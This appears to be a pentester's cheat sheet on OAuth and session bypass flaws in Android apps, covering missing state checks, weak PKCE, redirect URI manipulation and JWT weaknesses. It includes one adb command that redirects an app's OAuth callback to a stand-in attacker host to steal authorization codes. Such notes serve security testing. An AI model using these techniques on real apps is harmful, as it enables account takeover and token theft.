# OAuth & Session Bypass Patterns

## Missing State Parameter
If OAuth flow doesn't validate `state` on callback, attacker can CSRF
the login and bind their account to victim's session.

## Weak PKCE
- No code_challenge → authorization code interceptable
- Plain method instead of S256 → code_verifier predictable

## Redirect URI Manipulation
Intent extras controlling redirect_uri → steal auth code.
```bash
adb shell am start -n com.target/.OAuthActivity --es "redirect_uri" "https://evil.com/callback"
```

## JWT Bypass
- alg:none accepted → forge any claims
- No expiry check → replay old tokens
- Secret in APK → sign arbitrary JWTs
- Client-side decode without signature verification
